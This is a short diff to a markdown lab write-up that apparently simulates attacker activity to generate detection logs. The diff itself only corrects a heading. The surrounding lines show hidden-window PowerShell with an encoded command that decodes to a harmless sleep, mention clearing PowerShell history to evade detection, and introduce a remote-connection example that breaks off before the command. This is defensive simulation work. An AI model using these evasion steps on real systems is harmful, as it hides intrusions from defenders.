@@ -5,7 +5,7 @@
 ## 2. Execute PowerShell with an Encoded Command
 Command used: powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAAMQAwAA==
 ## 3. Deleted PowerShell history or cleared artifacts to evade detection.
-## 4.## Simulated Remote Connection Using PowerShell
+## 4. Simulated Remote Connection Using PowerShell
 The attacker then simulated a basic remote connection using PowerShell to mimic attacker behavior. This can be useful for generating log data related to data exfiltration or command-and-control activity.
 
 ### 🧪 Example Command:
